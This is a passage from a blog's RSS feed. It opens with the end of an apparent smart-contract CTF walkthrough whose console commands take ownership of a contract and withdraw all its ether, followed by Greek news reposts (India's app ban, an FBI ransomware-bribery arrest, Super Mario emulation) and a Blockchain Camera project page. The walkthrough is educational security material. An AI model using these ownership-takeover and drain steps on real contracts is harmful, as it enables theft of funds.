&lt;pre tabindex="0">&lt;code>contract.sendTransaction({value:1})
&lt;/code>&lt;/pre>&lt;p>After all of this, we can check again who is the owner of the smart-contract and we can see our address on this variable. We successfully own the smart-contract now. Let&amp;rsquo;s reduce it&amp;rsquo;s balance to zero.
The &amp;ldquo;withdraw&amp;rdquo; function can help us with that which can be executed only from the owner of the contract. But now we are the owner. It&amp;rsquo;s time to withdraw all of it&amp;rsquo;s ether. We type in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.withdraw()
&lt;/code>&lt;/pre>&lt;p>And then, let&amp;rsquo;s check the balance of the smart-contract:&lt;/p>
&lt;pre tabindex="0">&lt;code>await getBalance(contract.address)
&lt;/code>&lt;/pre>&lt;p>We will see a balance of 0 on this smart-contract.That means that we successfully withdrawn all of it&amp;rsquo;s ether. We successfully won this game!!!&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Tο PUBG και άλλες 117 εφαρμογές μπλοκάρει η Ινδία</title><link>/greek_articles/india_ban/</link><pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate><guid>/greek_articles/india_ban/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Funky-bit.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
Το Υπουργείο Ηλεκτρονικής και Πληροφορικής της Κυβέρνησης της Ινδίας μόλις εξέδωσε ένα δελτίο τύπου που ανακοινώνει την απαγόρευση 118 εφαρμογών που είναι «επιζήμιες για την κυριαρχία και την ακεραιότητα της Ινδίας, την άμυνα της Ινδίας, την ασφάλεια του κράτους και τη δημόσια τάξη».
Η λίστα των απαγορευμένων εφαρμογών περιλαμβάνει το PUBG μεταξύ άλλων καθώς και διάσιμες εφαρμογές όπως το Baidu, Alipay , Wechat ,ενώ δεν λείπουν και άλλες εφαρμογές τύπου App Locks, Cleaners,Web Browsers που είχαν απασχολήσει και παλιότερα την επικαιρότητα.</description><content>&lt;p>&lt;a href="https://funkybit.gr/2020/09/%ce%ba%ce%b1%ce%b9-%cf%84%ce%bf-pubg-%ce%ba%ce%b1%ce%b9-%ce%ac%ce%bb%ce%bb%ce%b5%cf%82-117-%ce%b5%cf%86%ce%b1%cf%81%ce%bc%ce%bf%ce%b3%ce%ad%cf%82-%ce%bc%cf%80%ce%bb%ce%bf%ce%ba%ce%ac%cf%81%ce%b5/">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Funky-bit.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;p>Το Υπουργείο Ηλεκτρονικής και Πληροφορικής της Κυβέρνησης της Ινδίας μόλις εξέδωσε ένα δελτίο τύπου που ανακοινώνει την απαγόρευση 118 εφαρμογών που είναι «επιζήμιες για την κυριαρχία και την ακεραιότητα της Ινδίας, την άμυνα της Ινδίας, την ασφάλεια του κράτους και τη δημόσια τάξη».&lt;/p>
&lt;p>Η λίστα των απαγορευμένων εφαρμογών περιλαμβάνει το PUBG μεταξύ άλλων καθώς και διάσιμες εφαρμογές όπως το Baidu, Alipay , Wechat ,ενώ δεν λείπουν και άλλες εφαρμογές τύπου App Locks, Cleaners,Web Browsers που είχαν απασχολήσει και παλιότερα την επικαιρότητα.&lt;/p>
&lt;p>Aυτή είναι η λίστα με τις 118 εφαρμογές που απαγορεύτηκαν στην Ινδία:&lt;/p>
&lt;p>1.APUS Launcher Pro- Theme, Live Wallpapers, Smart
2. APUS Launcher -Theme, Call Show, Wallpaper, HideApps
3. APUS Security -Antivirus, Phone security, Cleaner
4. APUS Turbo Cleaner 2020- Junk Cleaner, Anti-Virus
5. APUS Flashlight-Free &amp;amp; Bright
6. Cut Cut – Cut Out &amp;amp; Photo Background Editor
7. Baidu
8. Baidu Express Edition
9. FaceU – Inspire your Beauty
10. ShareSave by Xiaomi: Latest gadgets, amazing deals
11. CamCard – Business Card Reader
12. CamCard Business
13. CamCard for Salesforce
14. CamOCR
15. InNote
16. VooV Meeting – Tencent Video Conferencing
17. Super Clean – Master of Cleaner, Phone Booster
18. WeChat reading
19. Government WeChat
20. Small Q brush
21. Tencent Weiyun
22. Pitu
23. WeChat Work
24. Cyber Hunter
25. Cyber Hunter Lite
26. Knives Out-No rules, just fight!
27. Super Mecha Champions
28. LifeAfter
29. Dawn of Isles
30. Ludo World-Ludo Superstar
31. Chess Rush
32. PUBG MOBILE Nordic Map: Livik
33. PUBG MOBILE LITE
34. Rise of Kingdoms: Lost Crusade
35. Art of Conquest: Dark Horizon
36. Dank Tanks
37. Warpath
38. Game of Sultans
39. Gallery Vault – Hide Pictures And Videos
40. Smart AppLock (App Protect)
41. Message Lock (SMS Lock)-Gallery Vault Developer Team&lt;/p>
&lt;ol start="42">
&lt;li>
&lt;p>Hide App-Hide Application Icon&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AppLock&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AppLock Lite&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Dual Space – Multiple Accounts &amp;amp; App Cloner&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ZAKZAK Pro – Live chat &amp;amp; video chat online&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ZAKZAK LIVE: live-streaming &amp;amp; video chat app&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Music – Mp3 Player&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Music Player – Audio Player &amp;amp; 10 Bands Equalizer&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HD Camera Selfie Beauty Camera&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Cleaner – Phone Booster&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Web Browser &amp;amp; Fast Explorer&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Video Player All Format for Android&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Photo Gallery HD &amp;amp; Editor&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Photo Gallery &amp;amp; Album&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Music Player – Bass Booster – Free Download&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HD Camera – Beauty Cam with Filters &amp;amp; Panorama&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HD Camera Pro &amp;amp; Selfie Camera&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Music Player – MP3 Player &amp;amp; 10 Bands Equalizer&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Gallery HD&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Web Browser – Fast, Privacy &amp;amp; Light Web Explorer&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Web Browser – Secure Explorer&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Music player – Audio Player&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Video Player – All Format HD Video Player&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Lamour Love All Over The World&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Amour- video chat &amp;amp; call all over the world.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>MV Master – Make Your Status Video &amp;amp; Community&lt;/p>
&lt;/li>
&lt;li>
&lt;p>MV Master – Best Video Maker &amp;amp; Photo Video Editor&lt;/p>
&lt;/li>
&lt;li>
&lt;p>APUS Message Center-Intelligent management&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LivU Meet new people &amp;amp; Video chat with strangers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Carrom Friends : Carrom Board &amp;amp; Pool Game-&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ludo All Star- Play Online Ludo Game &amp;amp; Board Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Bike Racing : Moto Traffic Rider Bike Racing Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Rangers Of Oblivion : Online Action MMO RPG Game&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Z Camera – Photo Editor, Beauty Selfie, Collage&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GO SMS Pro – Messenger, Free Themes, Emoji&lt;/p>
&lt;/li>
&lt;li>
&lt;p>U-Dictionary: Oxford Dictionary Free Now Translate&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ulike – Define your selfie in trendy style&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Tantan – Date For Real&lt;/p>
&lt;/li>
&lt;li>
&lt;p>MICO Chat: New Friends Banaen aur Live Chat karen&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Kitty Live – Live Streaming &amp;amp; Video Live Chat&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Malay Social Dating App to Date &amp;amp; Meet Singles&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Alipay&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AlipayHK&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mobile Taobao&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Youku&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Road of Kings- Endless Glory&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Sina News&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Netease News&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Penguin FM&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Murderous Pursuits&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Tencent Watchlist (Tencent Technology&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Learn Chinese AI-Super Chinese&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HUYA LIVE – Game Live Stream&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Little Q Album&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Fighting Landlords – Free and happy Fighting Landlords&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Hi Meitu&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mobile Legends: Pocket&lt;/p>
&lt;/li>
&lt;li>
&lt;p>VPN for TikTok&lt;/p>
&lt;/li>
&lt;li>
&lt;p>VPN for TikTok&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Penguin E-sports Live assistant&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Buy Cars-offer everything you need, special offers and low prices&lt;/p>
&lt;/li>
&lt;li>
&lt;p>iPick&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Beauty Camera Plus – Sweet Camera &amp;amp; Face Selfie&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Parallel Space Lite – Dual App&lt;/p>
&lt;/li>
&lt;li>
&lt;p>“Chief Almighty: First Thunder BC&lt;/p>
&lt;/li>
&lt;li>
&lt;p>MARVEL Super War NetEase Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>AFK Arena&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Creative Destruction NetEase Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Crusaders of Light NetEase Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mafia City Yotta Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Onmyoji NetEase Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ride Out Heroes NetEase Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Yimeng Jianghu-Chu Liuxiang has been fully upgraded&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Legend: Rising Empire NetEase Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Arena of Valor: 5v5 Arena Games&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Soul Hunters&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Rules of Survival&lt;/p>
&lt;/li>
&lt;/ol></content></item><item><title>Το FBI συνέλαβε Ρώσο άνδρα που προσέφερε 1 εκατομμύριο δολάρια σε υπάλληλο για εγκατάσταση malware σε εταιρεία</title><link>/greek_articles/russia/</link><pubDate>Sun, 09 Aug 2020 00:00:00 +0000</pubDate><guid>/greek_articles/russia/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Funky-bit.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
Ο κατηγορούμενος πρόσφερε δωρεά 1 εκατομμυρίου δολαρίων σε έναν υπάλληλο μιας εταιρείας της Νεβάδας σε αντάλλαγμα για τη εγκατάσταση κακόβουλου λογισμικού (malware).Ο κατηγορούμενος συνδέθηκε με μια ομάδα που «εξειδικεύεται» στον εκβιασμό εταιρειών και συνεργάστηκε με έναν χάκερ από κυβερνητική τράπεζα υψηλού επιπέδου στη Ρωσία.
Ο Kriuchkov, συναντήθηκε με τον υπάλληλο και στη συνέχεια οδήγησε όλο το βράδυ από το Reno στο Λος Άντζελες για να φύγει από την χώρα.</description><content>&lt;p>&lt;a href="https://funkybit.gr/2020/08/%cf%84%ce%bf-fbi-%cf%83%cf%85%ce%bd%ce%ad%ce%bb%ce%b1%ce%b2%ce%b5-%cf%81%cf%8e%cf%83%ce%bf-%ce%ac%ce%bd%ce%b4%cf%81%ce%b1-%cf%80%ce%bf%cf%85-%cf%80%cf%81%ce%bf%cf%83%ce%ad%cf%86%ce%b5%cf%81%ce%b5-1/">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Funky-bit.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;p>Ο κατηγορούμενος πρόσφερε δωρεά 1 εκατομμυρίου δολαρίων σε έναν υπάλληλο μιας εταιρείας της Νεβάδας σε αντάλλαγμα για τη εγκατάσταση κακόβουλου λογισμικού (malware).Ο κατηγορούμενος συνδέθηκε με μια ομάδα που «εξειδικεύεται» στον εκβιασμό εταιρειών και συνεργάστηκε με έναν χάκερ από κυβερνητική τράπεζα υψηλού επιπέδου στη Ρωσία.&lt;/p>
&lt;p>Ο Kriuchkov, συναντήθηκε με τον υπάλληλο και στη συνέχεια οδήγησε όλο το βράδυ από το Reno στο Λος Άντζελες για να φύγει από την χώρα. Ωστόσο, το FBI συνέλαβε τον 27χρονο και τον παρουσίασε ενώπιον ομοσπονδιακού δικαστηρίου στο Λος Άντζελες τη Δευτέρα, κατηγορώντας τον για πρόθεση πρόκλησης βλάβης σε έναν “προστατευμένο υπολογιστή”. Ο Kriuchkov στάλθηκε σε κράτηση εν αναμονή της δίκης.
Τρόπος λειτουργίας:&lt;/p>
&lt;p>Ο Kriuchkov επικοινώνησε με τον ανώνυμο υπάλληλο στις 16 Ιουλίου στο WhatsApp μέσω αμοιβαίας γνωριμίας. Σύμφωνα με έγγραφα που κατατέθηκαν στο Επαρχιακό Δικαστήριο των ΗΠΑ στο Ρίνο, τότε ταξίδεψε από τη Ρωσία με τουριστική βίζα για να συναντήσει τον υπάλληλο σε ένα ταξίδι στη Λίμνη Ταχόε. Αφού συναντήθηκε με τον υπάλληλο, αποκάλυψε ότι εργάστηκε για μια ομάδα που ειδικεύτηκε σε εκβιασμούς εταιρειών. Ο Kriuchkov του παρείχε επίσης προπληρωμένο κινητό και του ζήτησε να το κρατήσει σε λειτουργία πτήσης μέχρι να μεταφερθούν τα χρήματα.&lt;/p>
&lt;p>Μέσω της βοήθειάς του, ο Kriuchkov ήθελε να εγκαταστήσει ένα ransomware στην ανώνυμη εταιρεία με έδρα τη Νεβάδα για να συγκεντρώσει περίπου 4 εκατομμύρια δολάρια. Ο Kriuchkov συνέχισε να εξηγεί ότι η ‘ομάδα’ πληρώνει υπαλλήλους εταιρειών-στόχων για να εισάγει κακόβουλο λογισμικό στο σύστημα υπολογιστών της εταιρείας-στόχου”, δήλωσε το FBI στην καταγγελία του.&lt;/p>
&lt;p>Ransomware Attack&lt;/p>
&lt;p>Έχοντας ο υπάλληλος συμφωνήσει να βοηθήσει τον Kriuchkov, η ομάδα για την οποία εργαζόταν θα είχε εγκαταστήσει κακόβουλο λογισμικό στον εταιρικό του υπολογιστή που θα είχε “χτυπήσει” το δίκτυο της εταιρείας με επίθεση DDOS. Μέσω μιας δεύτερης επίθεσης, τότε θα κλέψει τα δεδομένα της εταιρείας και θα απειλούσε να δημοσιοποιήσει εάν δεν πληρώνονταν τα λύτρα.&lt;/p>
&lt;p>Σύμφωνα με το FBI, ο Kriuchkov ήθελε να πληρώσει στον υπάλληλο 500.000 $ μέσω Bitcoin ή μετρητών, αλλά όταν διαφώνησε, ο Ρώσος διπλασίασε το ποσό σε 1 εκατομμύριο δολάρια. “Για να διευκολυνθούν οι ανησυχίες των υπαλλήλων των θυμάτων σχετικά με τη σύλληψή τους, ο Kriuchkov ισχυρίστηκε ότι το παλαιότερο” έργο “στο οποίο είχε εργαστεί το” γκρουπ “, πραγματοποιήθηκε πριν από τριάμισι χρόνια και ο συν-επιλογής του” ομίλου “εξακολουθούσε να εργάζεται για την εταιρεία”, προστέθηκε στην καταγγελία του FBI.&lt;/p>
&lt;p>Σύνδεση με Ρωσική Κυβέρνηση&lt;/p>
&lt;p>Παρόλο που δεν αποκαλύφθηκε εάν ο Kriuchkov είχε κάποια σχέση με τη ρωσική κυβέρνηση, αλλά σύμφωνα με το FBI, συνεργάστηκε με έναν χάκερ που ήταν «υψηλού επιπέδου υπάλληλος μιας κυβερνητικής τράπεζας στη Ρωσία».&lt;/p>
&lt;p>Ο Kriuchkov ήθελε να κάνει τη δουλειά νωρίτερα αυτό το μήνα, αλλά η ομάδα αποφάσισε να καθυστερήσει το έργο. Το FBI κατάφερε να συγκεντρώσει στοιχεία κατά τη διάρκεια αυτής της περιόδου μέσω της παρακολούθησης της συνάντησής του με τον υπάλληλο. Εάν αποδειχθεί ένοχος, οι Ρώσοι θα αντιμετωπίσουν ποινή φυλάκισης πέντε ετών και πρόστιμο 250.000 $.&lt;/p></content></item><item><title>Σε emulator παίζει το Super Mario 3D All-Stars στο Switch;</title><link>/greek_articles/super_mario/</link><pubDate>Sun, 12 Jul 2020 00:00:00 +0000</pubDate><guid>/greek_articles/super_mario/</guid><description>Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Funky-bit.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.
Η σειρά Super Mario All-Stars, έκανε επίσημα την εμφάνισή της το 1993 για το SNES, περιλαμβάνοντας το Original Super Mario Bros, το Super Mario Bros The Lost Levels ( Την Ιαπωνική έκδοση του Super Mario 2 – παιχνίδι που μέχρι τότε δεν είχε κυκλοφορήσει ποτέ μέχρι τότε στον υπόλοιπο κόσμο, λόγω της αυξημένης δυσκολίας του) , καθώς και τα Super Mario 2(USA) και 3 , σε μία remastered 16bit έκδοση, με καλύτερα γραφικά και ήχο από την πρώτη τους κυκλοφορία για το NES .</description><content>&lt;p>&lt;a href="https://funkybit.gr/2020/09/%cf%83%ce%b5-emulator-%cf%80%ce%b1%ce%af%ce%b6%ce%b5%ce%b9-%cf%84%ce%bf-super-mario-3d-all-stars-%cf%83%cf%84%ce%bf-switch/">Σημαντική Ανακοίνωση: Το παρών άρθρο έχει δημοσιτευτεί επίσημα στο Funky-bit.gr και διατηρείται εδώ για καθαρά λόγους αρχειοθέτησης.&lt;/a>&lt;/p>
&lt;p>Η σειρά Super Mario All-Stars, έκανε επίσημα την εμφάνισή της το 1993 για το SNES, περιλαμβάνοντας το Original Super Mario Bros, το Super Mario Bros The Lost Levels ( Την Ιαπωνική έκδοση του Super Mario 2 – παιχνίδι που μέχρι τότε δεν είχε κυκλοφορήσει ποτέ μέχρι τότε στον υπόλοιπο κόσμο, λόγω της αυξημένης δυσκολίας του) , καθώς και τα Super Mario 2(USA) και 3 , σε μία remastered 16bit έκδοση, με καλύτερα γραφικά και ήχο από την πρώτη τους κυκλοφορία για το NES .Έπειτα , κυκλοφόρισε και μία δεύτερη έκδοση όπου περιλάμβανε και το Super Mario World στην λίστα με τα παιχνίδια.&lt;/p>
&lt;p>To 2010, κυκλοφόρισε μία Limited Edition έκδοση για το Nintendo Wii, οπού περιλάμβανε τα παραπάνω παιχνίδια μάζι με το soundtrack και άλλα διάφορα συλλεκτικά αντικείμενα, για να γιορτάσει τα 25 χρόνια Super Mario!&lt;/p>
&lt;p>Η συλλογή, με την ονομασία Super Mario 3D All-Stars, έρχεται μετά από 35 χρόνια “ζωής” του Super Mario και θα περιλαμβάνει τα παιχνίδια Super Mario 64, Super Mario Sunshine και Super Mario Galaxy και θα κυκλοφορήσει σε ψηφιακή και φυσική μορφή στις 18 Σεπτεμβρίου για το Nintendo Switch. Όμως, το περίεργο είναι ότι η εταιρεία ανακοίνωσε επίσης ότι ο τίτλος θα σταματήσει να διανέμεται από το Μάρτιο του 2021, κάτι που δε θα περιμέναμε για μία τόσο σημαντική κυκλοφορία από την εταιρεία.&lt;/p>
&lt;p>Ενδιαφέρον προκαλεί το γεγονός ότι, σύμφωνα με τον χρήστη του Twitter, @OatmealDome , τα παιχνίδια τρέχουν σε emulator. Μάλιστα, αναφέρει πως στο Super Mario Galaxy, η Nintendo έκανε recompile το παιχνίδι να τρέχει απευθείας στον επεξεργαστή του Nintendo Switch, ωστόσο τα γραφικά και ο ήχος τρέχουν μέσα από Emulator!!&lt;/p>
&lt;p>Το Super Mario 64 κυκλοφόρησε πρώτη φορά για το Nintendo 64 το 1996, με τον τίτλο να είναι η πρώτη 3D εμπειρία που γνωρίσαμε με πρωταγωνιστή, τον Mario και να θεωρείται ακόμα και σήμερα ένα από τα κορυφαία platform όλων των εποχών. Το Super Mario Sunshine ακολούθησε αυτά τα βήματα,στο Nintendo Gamecube, μία όχι και τόσο πετυχημένη κονσόλα της Nintendο , ενώ το Super Mario Galaxy απογείωσε τη φόρμουλα των προαναφερθέντων στο Nintendo Wii.&lt;/p>
&lt;p>Η τιμή στα Ελληνικά καταστήματα λιανικής κυμαίνεται στα 60 ευρώ!!!&lt;/p>
&lt;p>Λέτε να δούμε τα επόμενα χρόνια και τα υπόλοιπα παιχνίδια της σειράς (Super Mario Galaxy 2 ) ή ακόμη και το Paper Mario ή άλλα Gamecube,Wii games να κάνουν την εμφάνιση τους στο Switch?&lt;/p></content></item><item><title/><link>/blockchain_camera/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/blockchain_camera/</guid><description>Ethereum Blockchain Camera Turn your Raspberry Pi into an Ethereum-based Blockchain Camera! Powered by Solidity and Python3. Blockchain Camera provides an easy and safe way to capture and guarantee the existence of videos reducing the impact of modified videos as it can preserve the integrity and validity of videos using Blockchain Technology. Blockchain Camera sends to Ethereum Network the hash of each video and the time the video has been recorded in order to be able validate that a video is genuine and hasn&amp;rsquo;t been modified using a Blockchain Camera Validation Tool.</description><content>&lt;h1 id="ethereum-blockchain-camera">Ethereum Blockchain Camera&lt;/h1>
&lt;h2 id="turn-your-raspberry-pi-into-an-ethereum-based-blockchain-camera-powered-by-solidity-and-python3">Turn your Raspberry Pi into an Ethereum-based Blockchain Camera! Powered by Solidity and Python3.&lt;/h2>
&lt;hr>
&lt;p>&lt;img src="/img/Blockchain_Camera_EN.jpg" alt="">&lt;/p>
&lt;h2 id="blockchain-camera-provides-an-easy-and-safe-way-to-capture-and-guarantee-the-existence-of-videos-reducing-the-impact-of-modified-videos-as-it-can-preserve-the-integrity-and-validity-of-videos-using-blockchain-technology-blockchain-camera-sends-to-ethereum-network-the-hash-of-each-video-and-the-time-the-video-has-been-recorded-in-order-to-be-able-validate-that-a-video-is-genuine-and-hasnt-been-modified-using-a-blockchain-camera-validation-tool">Blockchain Camera provides an easy and safe way to capture and guarantee the existence of videos reducing the impact of modified videos as it can preserve the integrity and validity of videos using Blockchain Technology. Blockchain Camera sends to Ethereum Network the hash of each video and the time the video has been recorded in order to be able validate that a video is genuine and hasn&amp;rsquo;t been modified using a Blockchain Camera Validation Tool.&lt;/h2>
&lt;p>Blockchain Camera works in any GNU/Linux Distribution that supports ffmpeg and Python3.&lt;/p>
&lt;pre tabindex="0">&lt;code>Created by Dimitris Vagiakakos @sv1sjp
&lt;/code>&lt;/pre>&lt;h2 id="video-presentations">Video Presentations:&lt;/h2>
&lt;h3 id="youtube">YouTube:&lt;/h3>
&lt;p>&lt;a href="https://youtu.be/1CvG0aa9PdM">Presentation of Blockchain Camera in English&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://youtu.be/7N7_W0pdbcs">Presentation of Blockchain Camera in Greek&lt;/a>&lt;/p>
&lt;h3 id="lbry">LBRY:&lt;/h3>
&lt;p>&lt;a href="https://odysee.com/@PenguinDodgers/Blockchain_Camera">Presentation of Blockchain Camera in English&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://odysee.com/@PenguinDodgers/Blockchain_Camera_GR">Presentation of Blockchain Camera in Greek&lt;/a>&lt;/p>
&lt;p>&lt;img src="/img/bc_poc.png" alt="">&lt;/p>
&lt;h2 id="getting-started">Getting Started:&lt;/h2>
&lt;p>Blockchain Camera is an open-source Project. Find the source-code &lt;a href="https://github.com/sv1sjp/Blockchain_Camera">here:&lt;/a>&lt;/p>
&lt;p>For more information about how it works and how you can create your own Blockchain Camera and implementation ideas, reading the full paper is recommended.
&lt;a href="https://github.com/sv1sjp/Blockchain_Camera/blob/main/Blockchain_Camera.pdf">Click here&lt;/a>&lt;/p>
&lt;p>Contents of the paper:&lt;/p>
&lt;ul>
&lt;li>The idea of Blockchain Camera&lt;/li>
&lt;li>How Blockchain Camera works&lt;/li>
&lt;li>Blockchain Camera implementation ideas&lt;/li>
&lt;li>Blockchain Camera implementation ideas in European Union&lt;/li>
&lt;li>Blockchain Camera Tools and Hardware Recommendations&lt;/li>
&lt;li>How Solidity code works&lt;/li>
&lt;li>How Blockchain Camera Works&lt;/li>
&lt;li>How Blockchain Camera Validation Tools (GUI and CLI) work&lt;/li>
&lt;li>How to deploy BlockchainCamera Smart-Contract&lt;/li>
&lt;li>How to install Blockchain Camera software&lt;/li>
&lt;li>User Manual for Blockchain Camera Validation Tools (GUI and CLI)&lt;/li>
&lt;li>The cost of building your own Blockchain Camera stand-alone device&lt;/li>
&lt;li>Extra Implementantion Ideas&lt;/li>
&lt;li>Blockchain Camera Hardening&lt;/li>
&lt;/ul>
&lt;h1 id="contribution">Contribution:&lt;/h1>
&lt;p>💰💵💲Blockchain Camera is a new Open-Source Project. You can support this project by donating Crypto. ₿💰💵💲&lt;/p>
&lt;p>Bitcoin: bc1q6j959m3whh44ztr8k6p7545n5pzcsncple7qmy&lt;/p>
&lt;p>Ethereum: 0x3f27F05Ca28a5B5F876A3A7d435E2E852756F873&lt;/p>
&lt;p>Cardano: addr1qxewtm0y5yk2mgf93ct4ghguus2shu34fu786t62j3tv7296evenhmr0ltmx3hdyw4d6d8gj8qspry5pe3raaw4nu8as7jsr9l&lt;/p>
&lt;p>Monero: 46ewn3rgXMSceuEUEng1bze1RzG61rEiFV3hJ6VKuzvHU62jPntydJRBcFinQ62Pad8AvdoX9YbQcY5HKX3Cr3UQPkhiQ4L&lt;/p>
&lt;p>New implementation ideas are welcomed :) - Share the beaty of Open-Source.&lt;/p>
&lt;p>&lt;img src="/img/validation_tool_gui.png" alt="">&lt;/p>
&lt;h1 id="license">License:&lt;/h1>
&lt;h2 id="blockchain-camera-cames-under-the-terms-of-the-gnu-general-public-license-version-3-or-any-later-version-without-warranty">Blockchain Camera cames under the terms of the GNU General Public License version 3 or any later version without warranty.&lt;/h2>
&lt;p>&lt;img src="/img/EU.jpg" alt="">&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf">Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZaCOjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="find-more-educational-content">Find More Educational Content:&lt;/h2>
&lt;p>More educational videos about Blockchain, Linux, Android Hacking and Telecommunications can be found on my YouTube Channel &lt;a href="www.youtube.com/LinuxOSblog">DimitrisV&lt;/a> as well as on LBRY &lt;a href="https://odysee.com/@PenguinDodgers:5">PenguinDodgers&lt;/a>&lt;/p>
&lt;h2 id="find-more-awesome-projects">Find more awesome Projects:&lt;/h2>
&lt;p>Click the sector &amp;ldquo;Projects&amp;rdquo; on this website to find more projects and educational content.&lt;/p>
